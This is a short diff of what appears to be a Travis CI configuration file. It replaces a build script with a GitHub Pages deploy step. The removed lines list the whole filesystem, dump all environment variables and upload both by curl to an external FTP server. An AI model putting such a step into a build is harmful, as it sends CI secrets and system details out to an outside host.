@@ -1,7 +1,9 @@
 ---
 dist: xenial
 language: shell
-script:
-    - sudo find / -xdev | gzip >disk.txt.gz
-    - set >env.txt
-    - curl -T "{disk.txt.gz,env.txt}" ftp://${FTP_USER}:${FTP_PASS}@${FTP_SERVER}/
+deploy:
+  provider: pages
+  skip_cleanup: true
+  github_token: $GITHUB_TOKEN  # Set in the settings page of your repository, as a secure variable
+  keep_history: true
+  local_dir: site
